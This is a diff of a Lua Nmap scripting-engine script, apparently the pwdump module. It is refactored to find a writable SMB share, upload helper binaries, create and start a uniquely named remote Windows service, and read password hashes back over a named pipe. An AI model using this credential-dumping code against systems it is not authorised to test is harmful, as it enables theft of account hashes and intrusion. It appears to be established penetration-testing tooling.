@@ -89,8 +89,8 @@ require 'msrpc'
 require 'smb'
 require 'stdnse'
 
-local SERVICE  = "nmap-pwdump"
-local PIPE     = "nmap-pipe"
+local SERVICE  = "nmap-pwdump-"
+local PIPE     = "nmap-pipe-"
 
 local FILE1     = "nselib/data/lsremora.dll"
 local FILENAME1 = "lsremora.dll"
@@ -105,31 +105,34 @@ end
 
 ---Stop/delete the service and delete the service file. This can be used alone to clean up the 
 -- pwdump stuff, if this crashes. 
-function cleanup(host)
+--
+--@param host        The host object. 
+--@param share       The share to clean up on. 
+--@param path        The local path to the share. 
+--@param service_name The name to use for the service. 
+function cleanup(host, share, path, service_name)
 	local status, err
 
-	stdnse.print_debug(1, "Entering cleanup() -- errors here can generally be ignored")
+	stdnse.print_debug(1, "Entering cleanup('%s', '%s', '%s') -- errors here can generally be ignored", share, path, service_name)
 	-- Try stopping the service
-	status, err = msrpc.service_stop(host, SERVICE)
+	status, err = msrpc.service_stop(host, SERVICE .. service_name)
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't stop service: %s", err)
 	end
 
---	os.exit()
-
 	-- Try deleting the service
-	status, err = msrpc.service_delete(host, SERVICE)
+	status, err = msrpc.service_delete(host, SERVICE .. service_name)
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't delete service: %s", err)
 	end
 
 	-- Delete the files
-	status, err = smb.file_delete(host, "C$", "\\" .. FILENAME1)
+	status, err = smb.file_delete(host, share, "\\" .. FILENAME1)
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't delete %s: %s", FILENAME1, err)
 	end
 
-	status, err = smb.file_delete(host, "C$", "\\" .. FILENAME2)
+	status, err = smb.file_delete(host, share, "\\" .. FILENAME2)
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't delete %s: %s", FILENAME2, err)
 	end
@@ -140,16 +143,16 @@ function cleanup(host)
 end
 
 
-function upload_files(host)
+function upload_files(host, share)
 	local status, err
 
-	status, err = smb.file_upload(host, FILE1, "C$", "\\" .. FILENAME1)
+	status, err = smb.file_upload(host, FILE1, share, "\\" .. FILENAME1)
 	if(status == false) then
 		cleanup(host)
 		return false, string.format("Couldn't upload %s: %s\n", FILE1, err)
 	end
 
-	status, err = smb.file_upload(host, FILE2,   "C$", "\\" .. FILENAME2)
+	status, err = smb.file_upload(host, FILE2,   share, "\\" .. FILENAME2)
 	if(status == false) then
 		cleanup(host)
 		return false, string.format("Couldn't upload %s: %s\n", FILE2, err)
@@ -183,18 +186,19 @@ function read_and_decrypt(host, key, pipe)
 				break
 			end
 
-			stdnse.print_debug(1, "WaitForNamedPipe() failed: %s (this may be normal behaviour)", wait_result)
 			j = j + 1
-			-- TODO: Wait 50ms, if there's a time when we get an actual sleep()-style function. 
+			-- Wait 50ms, if there's a time when we get an actual sleep()-style function. 
+			stdnse.sleep(.05)
 		until status == true
 
-		if(j == 100) then
+		if(j == 10) then
 			smbstop(smbstate)
 			return false, "WaitForNamedPipe() failed, service may not have been created properly."
 		end
 
 		-- Get a handle to the pipe
-		status, create_result = smb.create_file(smbstate, "\\" .. pipe)
+		local overrides = {}
+		status, create_result = smb.create_file(smbstate, "\\" .. pipe, overrides)
 		if(status == false) then
 			smb.stop(smbstate)
 			return false, create_result
@@ -267,8 +271,28 @@ function go(host)
 	local key = ""
 	local i
 
+	local result
+	local service_name
+	local share, path
+
+	result, service_name = smb.get_uniqueish_name(host)
+	if(result == false) then
+		return false, string.format("Error generating service name: %s", service_name)
+	end
+	stdnse.print_debug("pwdump: Generated static service name: %s", service_name)
+
+	-- Try and find a share to use. 
+	result, share, path = smb.share_find_writable(host)
+	if(result == false) then
+		return false, string.format("Couldn't find a writable share: %s", share)
+	end
+	if(path == nil) then
+		return false, string.format("Couldn't find path to writable share (we probably don't have admin access): '%s'", share)
+	end
+	stdnse.print_debug(1, "pwdump: Found usable share %s (%s)", share, path)
+
 	-- Start by cleaning up, just in case. 
-	cleanup(host)
+	cleanup(host, share, path, service_name)
 
 	-- It seems that, in my tests, if a key contains either a null byte or a negative byte (>= 0x80), errors
 	-- happen. So, at the cost of generating a weaker key (keeping in mind that it's already sent over the 
@@ -280,42 +304,42 @@ function go(host)
 	end
 
 	-- Upload the files
-	status, err = upload_files(host)
+	status, err = upload_files(host, share)
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't upload the files: %s", err)
-		cleanup(host)
+		cleanup(host, share, path, service_name)
 		return false, string.format("Couldn't upload the files: %s", err)
 	end
 
 	-- Create the service
-	status, err = msrpc.service_create(host, SERVICE, "c:\\servpw.exe")
+	status, err = msrpc.service_create(host, SERVICE .. service_name, path .. "\\servpw.exe")
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't create the service: %s", err)
-		cleanup(host)
+		cleanup(host, share, path, service_name)
 
 		return false, string.format("Couldn't create the service on the remote machine: %s", err)
 	end
 
 	-- Start the service
-	status, err = msrpc.service_start(host, SERVICE, {PIPE, key, tostring(string.char(16)), tostring(string.char(0)), "servpw.exe"})
+	status, err = msrpc.service_start(host, SERVICE .. service_name, {PIPE .. service_name, key, tostring(string.char(16)), tostring(string.char(0)), "servpw.exe"})
 	if(status == false) then
 		stdnse.print_debug(1, "Couldn't start the service: %s", err)
-		cleanup(host)
+		cleanup(host, share, path, service_name)
 
 		return false, string.format("Couldn't start the service on the remote machine: %s", err)
 	end
 
 	-- Read the data
-	status, results = read_and_decrypt(host, key, PIPE)
+	status, results = read_and_decrypt(host, key, PIPE .. service_name)
 	if(status == false) then
 		stdnse.print_debug(1, "Error reading data from remote service")
-		cleanup(host)
+		cleanup(host, share, path, service_name)
 
 		return false, string.format("Failed to read password data from the remote service: %s", err)
 	end
 
 	-- Clean up what we did
-	cleanup(host)
+	cleanup(host, share, path, service_name)
 
 	return true, results
 end
